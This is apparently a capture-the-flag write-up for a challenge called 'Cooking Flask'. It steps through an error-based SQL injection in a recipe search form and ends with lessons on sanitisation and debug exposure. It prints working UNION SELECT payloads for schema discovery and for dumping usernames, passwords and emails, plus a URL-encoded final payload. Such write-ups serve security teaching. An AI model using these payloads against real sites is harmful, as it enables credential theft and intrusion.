# Cooking Flask

## Challenge Description

```
I threw together my own website! It's halfway done. 
Right now, you can search for recipes and stuff. 
I don't know a ton about coding and DBs, 
but I think I know enough so that no one can steal my admin password... 
I do know a lot about cooking though. 
All this food is going to make me burp. Sweet, well good luck
```

## Reconnaissance

### Endpoint Analysis
- `/` - Redirects to /search
- `/search` - Recipe search page (functional)
- `/try_recipes` - Error page (unfinished)
- `/create_recipe` - Error page (unfinished) 
- `/me` - Error page (unfinished)

The challenge description mentions it's a halfway done website, confirming that several endpoints are incomplete.

### Initial Testing
Injecting `"'.` into search fields triggers debug mode with `sqlite3.OperationalError`, indicating potential SQL injection vulnerability.

## Vulnerability Analysis

### Field Testing
Testing each input field with `"'.` payload:
- `recipe_name` field: No error - passes to server normally
- `description` field: No error - passes to server normally  
- `tags` field: **SQL injection vulnerable** - triggers debug mode

### Error Analysis
Debug output shows:
```python
cursor.execute(query, params)
```
This indicates user input is directly concatenated into SQL query string before parameterization, making SQL injection possible.

### Query Structure Discovery
Based on `unrecognized token` error in debug mode, the vulnerable query structure appears to be:
```sql
SELECT something FROM something WHERE ('%" + tags_input + "%') something;
```

When `"'.` is injected, it breaks the query syntax by prematurely closing the string.

## Exploitation Process

### Step 1: Query Structure Confirmation
**Payload:** `"%')--`
- **Result:** 200 OK (successful response)
- **Analysis:** Confirms the query structure and that SQL comment injection works

The resulting query becomes:
```sql
SELECT ... FROM ... WHERE ('%" "%')-- "%') ...;
```

### Step 2: UNION SELECT Column Count Discovery
Starting with basic UNION SELECT to extract table information:
```sql
UNION SELECT name FROM sqlite_master--
```

**Error:** `SELECTs to the left and right of UNION do not have the same number of result columns`

This indicates we need to match the column count of the original SELECT statement.

Incrementally testing column counts:
```sql
UNION SELECT name,'','','' FROM sqlite_master--  # 4 columns - still error
UNION SELECT name,'','','','','','','' FROM sqlite_master--  # 8 columns - different error
```

With 8 columns, we get a new error indicating successful column count match.

### Step 3: Data Type Validation
Using 8 columns with dummy values:
```sql
UNION SELECT name,'1','2','3','4','5','6','7' FROM sqlite_master--
```

**Pydantic Validation Error:**
```
ValidationError: 3 validation errors for Recipe
recipe_id: Input should be a valid integer [input_value='login_attempt']
date_created: Datetimes provided to dates should have zero time [input_value='2']
tags: Input should be a valid list [input_value=6]
```

This reveals the expected data types for the Recipe model:
- Column 1: integer (recipe_id)
- Column 3: date (date_created) 
- Column 7: list (tags)

### Step 4: Corrected Payload for Table Discovery
**Payload:**
```sql
UNION SELECT 0,name,'2025-05-20','3','4','5','[]','7' FROM sqlite_master--
```

**Result:** Successfully displays table names including `user` table.

### Step 5: Schema Discovery
To understand the structure of the `user` table:
```sql
UNION SELECT 0,sql,'2025-05-20',3,'4','5','[]',7 FROM sqlite_master WHERE type='table' AND name='user'--
```

**Result:** Returns the CREATE TABLE statement revealing columns:
- `username`
- `password`  
- `user_email`

### Step 6: Data Extraction
Final payload to extract user credentials:
```sql
UNION SELECT 0,username,'2025-05-20',3,password,user_email,'[]',7 FROM user--
```

**Result:** Successfully extracts username and password from the user table, revealing the flag in the password field.

## Complete Exploitation Chain

### Final Working Payload
```
"%') UNION SELECT 0,username,'2025-05-20',3,password,user_email,'[]',7 FROM user--
```

### URL Encoded Version
```
%22%25%27%29%20UNION%20SELECT%200%2Cusername%2C%272025-05-20%27%2C3%2Cpassword%2Cuser_email%2C%27%5B%5D%27%2C7%20FROM%20user--
```

## Key Takeaways

### Error-Based SQL Injection Techniques
1. **Debug Mode Exploitation:** Error messages provide valuable information about query structure and data types
2. **Pydantic Validation Errors:** Modern frameworks often reveal expected data types through validation errors
3. **SQLite System Tables:** `sqlite_master` table contains complete schema information

### Technical Insights
- **Column Count Discovery:** UNION SELECT requires exact column count matching
- **Data Type Compatibility:** SQLite is flexible with type conversion but framework validation may be strict  
- **Query Structure Analysis:** Error messages can reveal the exact SQL query construction
- **Comment Injection:** SQL comments (`--`) are crucial for bypassing remaining query parts

### Security Implications
- **Input Sanitization:** Direct string concatenation in SQL queries creates injection vulnerabilities
- **Debug Mode Exposure:** Debug information should never be exposed in production
- **Framework Validation:** While Pydantic validation helps, it doesn't prevent SQL injection if queries are constructed unsafely

This challenge demonstrates a classic SQL injection vulnerability combined with modern Python web framework error handling, showing how traditional attack techniques remain relevant in contemporary applications.
